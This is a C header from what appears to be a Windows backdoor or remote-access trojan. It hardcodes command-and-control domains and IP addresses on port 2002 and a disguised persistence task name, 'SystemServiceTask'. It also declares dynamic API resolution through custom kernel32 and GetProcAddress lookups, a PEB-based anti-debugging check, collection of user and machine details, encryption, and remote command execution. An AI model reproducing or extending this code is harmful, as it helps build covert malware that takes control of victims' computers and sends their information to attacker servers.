
#ifndef PUBLIC_H_H_H
#define PUBLIC_H_H_H


#include <windows.h>
#include <DbgHelp.h>
//#include "projects_variables.h"
#include <lm.h>

#define OUTPUT_FORMAT_EXE
//#define OUTPUT_FORMAT_DLL

#define MAX_TRANSFER_BUFFER_SIZE	0x100000
#define SERVER_PORT					2002

#define SERVER_IP_DOMAINNAME
#ifdef SERVER_IP_DOMAINNAME
//#define LOCAL_SERVER_BIND_IP		"www.eyw168.com"
#define SERVER_IP_ADDRESS_DOMAINNAME	"zozotown888.hopto.org"
#define SERVER_IP_ADDRESS_BAKEDOMAINNAME	"zozotown888.hopto.org"

//#define SERVER_IP_ADDRESS_DOMAINNAME	"www.liujinguangsdm.xyz"
//#define SERVER_IP_ADDRESS_BAKEDOMAINNAME	"www.liujinguangsdn.top"
#else
#ifdef _DEBUG
#define LOCAL_SERVER_BIND_IP "192.168.10.183"
//#define LOCAL_SERVER_BIND_IP "192.168.1.102"	
//#define LOCAL_SERVER_BIND_IP "115.236.49.68"
#else
//#define LOCAL_SERVER_BIND_IP "1.32.216.22"
#define LOCAL_SERVER_BIND_IP "115.236.49.68"
#endif
#endif


#define TASKNAME "SystemServiceTask"

#define CRYPT_KEY_SIZE			16
#define SYSTEM_VERSION_WIN9X	1
#define SYSTEM_VERSION_WIN2000	2
#define SYSTEM_VERSION_XP		3
#define SYSTEM_VERSION_VISTA	4
#define SYSTEM_VERSION_WIN7		5
#define SYSTEM_VERSION_WIN8		6
#define SYSTEM_VERSION_WIN10	7
#define SYSTEM_VERSION_UNKNOW	8


typedef HINSTANCE (__stdcall *ptrShellExecuteA)( HWND hwnd,  LPCSTR lpOperation,  LPCSTR lpFile,  LPCSTR lpParameters,LPCSTR lpDirectory,INT nShowCmd);
typedef DWORD (__stdcall *ptrGetProcAddress)(HMODULE,LPSTR);
typedef HMODULE (__stdcall *ptrLoadLibraryA)(LPSTR);
typedef HANDLE (WINAPI *ptrCreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL (WINAPI *ptrCloseHandle)( HANDLE hObject);
typedef BOOL (WINAPI *ptrReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *ptrWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef int (WINAPIV *ptrwsprintfA)(LPSTR,LPCSTR,...);
typedef int (__stdcall *ptrWSAStartup)(WORD,LPWSADATA);
typedef DWORD (__stdcall *ptrsend)(SOCKET,char *,DWORD,DWORD);
typedef DWORD (__stdcall *ptrrecv)(SOCKET,char *,DWORD,DWORD);
typedef DWORD (__stdcall *ptrclosesocket)(SOCKET);
typedef DWORD (__stdcall *ptrconnect)(SOCKET,sockaddr*,DWORD);
typedef DWORD (__stdcall *ptrinet_addr)(char *);
typedef unsigned short (__stdcall *ptrntohs)(unsigned short);
typedef DWORD (__stdcall * ptrgethostname)(char * ,int);
typedef SOCKET (__stdcall * ptrsocket)(UINT,UINT,UINT);
typedef hostent* (__stdcall * ptrgethostbyname)(char*);
typedef void (__stdcall * ptrWSACleanup)();
typedef void (_stdcall * ptrSleep)(DWORD);
typedef int (__stdcall *ptrlstrlenA)( __in LPCSTR lpString );
typedef int (__stdcall *ptrlstrcatA)( __in LPCSTR lpString1 ,LPCSTR lpString2);
typedef int (__stdcall *ptrlstrcpyA)( __in LPCSTR lpString1 ,LPCSTR lpString2);

typedef int(__stdcall *ptrWinExec)(LPCSTR cmd, int type);

typedef  BOOL (WINAPI *ptrGetUserNameA) (LPSTR lpBuffer,LPDWORD pcbBuffer);
typedef BOOL (WINAPI *ptrGetComputerNameA) (LPSTR lpBuffer,LPDWORD nSize);
typedef UINT (WINAPI * ptrGetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
typedef VOID (WINAPI * ptrGetSystemTime)( LPSYSTEMTIME lpSystemTime);
typedef NET_API_STATUS (WINAPI * ptrNetWkstaGetInfo) (   LMSTR   servername ,IN  DWORD   level, LPBYTE  *bufptr);
typedef NET_API_STATUS (WINAPI * ptrNetApiBufferFree) ( LPVOID Buffer);
typedef int (WINAPI*ptrMakeSureDirectoryPathExists)(char*);

typedef DWORD (__stdcall *ptrRegCreateKeyA)(HKEY,char *,PHKEY);
typedef DWORD (__stdcall *ptrRegCloseKey)(HKEY);
typedef DWORD (__stdcall *ptrRegQueryValueExA)(HKEY,char *,LPDWORD,LPDWORD,LPVOID,LPDWORD);
typedef DWORD (__stdcall *ptrRegSetValueExA)(HKEY,char *,DWORD,DWORD,LPVOID,DWORD);
typedef int (__stdcall *ptrRegOpenKeyExA)(HKEY, char *, DWORD, REGSAM, PHKEY);
typedef int (__stdcall *ptrRegEnumKeyExA)(HKEY, DWORD, char *,LPDWORD, LPDWORD, char *, LPDWORD, PFILETIME);
typedef DWORD (__stdcall *ptrRegDeleteKeyA)( __in HKEY hKey, __in LPCSTR lpSubKey );
typedef LSTATUS (APIENTRY *ptrRegCreateKeyExA)(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,REGSAM samDesired,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition);


extern ptrLoadLibraryA			lpLoadLibraryA ;
extern ptrGetProcAddress		lpGetProcAddress ;
extern ptrShellExecuteA		lpShellExecuteA ;
extern ptrCreateFileA			lpCreateFileA ;
extern ptrCloseHandle			lpCloseHandle ;
extern ptrReadFile				lpReadFile ;
extern ptrWriteFile			lpWriteFile ;
extern ptrWinExec			lpWinExec;
extern ptrSleep				lpSleep ;
extern ptrlstrlenA				lplstrlenA ;
extern ptrlstrcatA				lplstrcatA ;
extern ptrlstrcpyA				lplstrcpyA ;
extern ptrwsprintfA			lpwsprintfA ;
extern ptrWSAStartup			lpWSAStartup;
extern ptrsend					lpsend;
extern ptrrecv					lprecv;
extern ptrclosesocket			lpclosesocket;
extern ptrconnect				lpconnect;
extern ptrinet_addr			lpinet_addr;
extern ptrntohs				lpntohs;
extern ptrgethostname			lpgethostname;
extern ptrsocket				lpsocket;
extern ptrgethostbyname		lpgethostbyname;
extern ptrWSACleanup			lpWSACleanup;

extern ptrGetUserNameA			lpGetUserNameA ;
extern ptrGetComputerNameA		lpGetComputerNameA ;
extern ptrGetSystemDirectoryA	lpGetSystemDirectoryA ;
extern ptrNetWkstaGetInfo		lpNetWkstaGetInfo ;
extern ptrNetApiBufferFree		lpNetApiBufferFree ;
extern ptrMakeSureDirectoryPathExists lpMakeSureDirectoryPathExists ;

extern ptrRegCreateKeyA			lpRegCreateKeyA;
extern ptrRegCloseKey			lpRegCloseKey;
extern ptrRegQueryValueExA		lpRegQueryValueExA;
extern ptrRegSetValueExA		lpRegSetValueExA;
extern ptrRegOpenKeyExA			lpRegOpenKeyExA;
extern ptrRegEnumKeyExA			lpRegEnumKeyExA;
extern ptrRegDeleteKeyA			lpRegDeleteKeyA;
extern ptrRegCreateKeyExA		lpRegCreateKeyExA;

extern HMODULE lpDllShell32 ;
extern HMODULE lpDllKernel32 ;
extern HMODULE lpDllUser32 ;
extern HMODULE lpDllWs2_32 ;
extern HMODULE lpDllAdiapi32 ;
extern HMODULE lpDllNetApi32 ;
extern HMODULE lpDllDbghelp ;


#define LOG_FILENAME			"log.txt"

int WriteLogFile(char * pLog);
int CryptData(char * lpdata,int len,unsigned char * key);
int GetCpuBits();
DWORD GetApi();
FARPROC MyGetProcAddr(HMODULE hKernel32);
HMODULE GetDllKernel32Base();
int  PebNtGlobalFlagsApproach();
int GetUserAndComputerName(char * szUsername,char * szComputerName);
int GetWindowsVersion();

#endif